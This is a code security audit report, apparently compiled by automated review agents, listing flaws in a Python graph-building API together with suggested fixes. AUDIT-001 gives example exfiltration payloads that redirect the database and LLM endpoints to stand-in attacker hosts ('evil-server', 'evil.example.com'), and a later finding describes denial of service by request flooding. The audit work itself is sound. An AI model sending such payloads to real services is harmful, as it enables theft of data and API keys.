#### AUDIT-001: Runtime config override allows arbitrary `os.environ` mutation — full infrastructure takeover

- **Agents:** exploit-hunter (R-002), input-fuzzer (R-002)
- **File:** `src/api/app.py:281-329` and `src/api/auth.py:54-57`
- **Issue:** The `POST /api/v1/config` endpoint accepts an `overrides` dict and applies values directly to `os.environ`. The blocklist approach has critical gaps: it only covers known cloud provider keys, demo/ablation endpoints can bypass via `to_env_overrides()`, and URL overrides could redirect Neo4j/LLM connections to attacker-controlled servers. Writes are permanent for the process lifetime.
- **Adversarial scenario:**
  1. Attacker sends `POST /api/v1/config` with `{"overrides": {"neo4j_uri": "bolt://evil-server:7687"}}` to redirect all Neo4j traffic, exfiltrating all graph data.
  2. Attacker sets `{"LLM_ENDPOINT_REASONING": "https://evil.example.com/v1"}` to capture API keys in request headers and exfiltrate all LLM prompts containing DDL schemas and business documents.
- **Impact:** Full process-level environment poisoning. Redirect database/LLM connections to attacker infrastructure. Exfiltrate API keys.
- **Likelihood:** 4/5 (requires valid API key, but attack is straightforward)
- **Suggested fix:** Replace blocklist with an explicit allowlist of modifiable keys. Never accept endpoint URL overrides at runtime. Require server restart for infrastructure changes.

#### AUDIT-002: Direct in-place mutation of LangGraph state via `state.setdefault()`

- **Agents:** logic-auditor (B-001), convention-guardian (B-002), integration-inspector (B-003)
- **File:** `src/graph/build_nodes.py:455`
- **Function:** `_node_build_graph`
- **Issue:** `state.setdefault("embedding_failures", []).append(concept_name)` mutates the live state dict in-place instead of returning the update through LangGraph's reducer. The appended value is lost on the next node invocation, and if another node reads `embedding_failures` concurrently, it sees a partially-modified list. The field is also not declared in `BuilderState` TypedDict.
- **Adversarial scenario:** In parallel mapping mode, concurrent threads access the same state dict, causing data races on the mutated list.
- **Impact:** Silent state corruption; `embedding_failures` not persisted by checkpoint system; thread-safety concern in parallel mode; invisible to type checkers.
- **Suggested fix:** Add `embedding_failures: list[str]` to `BuilderState` TypedDict. Replace `state.setdefault()` with building a new list and returning it in the node's return dict.

#### AUDIT-003: `log_retry_event()` defined but never called anywhere in the codebase

- **Agent:** convention-guardian (B-003)
- **File:** `src/config/logging.py:140-158`
- **Convention:** CLAUDE.md — Error Handling: `log_retry_event()` before each reflection retry

No node calls it before reflection retries in `triplet_extractor.py`, `rag_mapper.py`, `llm_judge.py`, `validator.py`, `cypher_healer.py`, or `hallucination_grader.py`. #### AUDIT-004: Auth bypass on DELETE /graph when API_KEY cleared at runtime

- **Agent:** input-fuzzer (R-001)
- **File:** `src/api/demo_router.py:563`
- **Function:** `delete_graph`
- **Issue:** The endpoint checks `os.environ.get("API_KEY")` directly instead of relying on the router-level `require_api_key` dependency. If `API_KEY` is cleared at runtime (e.g., via the config POST endpoint from AUDIT-001), destructive graph wipes become unprotected.

- **Impact:** Destructive graph wipe without proper auth.
- **Suggested fix:** Remove redundant `os.environ.get("API_KEY")` check; rely solely on `require_api_key`. Block destructive ops when auth is disabled.

#### AUDIT-006: Unbounded in-memory job store — OOM via rapid job creation

- **Agent:** input-fuzzer (R-005)
- **File:** `src/api/jobs.py:43`
- **Function:** `create_job`
- **Issue:** `_evict_stale_jobs` only removes terminal-state jobs. Running/queued jobs accumulate without limit, and `meta` dicts have no size bound. Rapid-fire API calls create lingering jobs that exhaust memory.
- **Fuzz input:** Rapid-fire `POST /api/v1/demo/build` with invalid paths

- **Actual behavior:** Unbounded dict growth leading to OOM
- **Impact:** Denial of service via memory exhaustion
- **Suggested fix:** Count all jobs against a hard limit; cap `meta` dict size to ~4KB; add max-size eviction.

#### AUDIT-008: Cypher injection via f-string interpolation of `depth`/`limit` in graph_traversal

- **Agents:** exploit-hunter (R-001), input-fuzzer (R-013), logic-auditor (B-023)
- **File:** `src/retrieval/hybrid_retriever.py:311`
- **Issue:** `f"MATCH (start)-[r*1..{d}]-(neighbor)"` embeds depth directly into Cypher. While `d` comes from validated settings, the pattern is architecturally dangerous. Negative or huge values produce invalid or expensive Cypher.
- **Impact:** If exploited, arbitrary Cypher execution or resource exhaustion.
- **Suggested fix:** Clamp depth to `[1, 3]` and validate type before interpolation.
